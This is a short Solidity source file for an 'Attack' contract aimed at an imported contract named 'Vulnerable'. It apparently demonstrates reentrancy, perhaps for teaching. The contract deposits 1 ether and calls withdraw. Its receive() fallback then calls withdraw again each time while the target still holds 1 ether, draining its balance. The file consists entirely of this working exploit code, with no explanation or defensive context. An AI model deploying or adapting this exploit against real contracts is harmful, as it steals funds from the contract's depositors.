// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0 <0.9.0;


import "./Vulnerable.sol";

contract Attack {
    Vulnerable public vulnerable;


    constructor(address vulnerableAddress) {
        vulnerable = Vulnerable(vulnerableAddress);//create object using address
    }


    function attack() external payable{
        vulnerable.deposit{value:1 ether}();
        vulnerable.withdraw();
    }
   
    function callerCheck() public view returns(address){
        return vulnerable.callerAddress();
    }
   
    receive() external payable{
        if(address(vulnerable).balance>= 1 ether){
            vulnerable.withdraw();
        }
    }
}


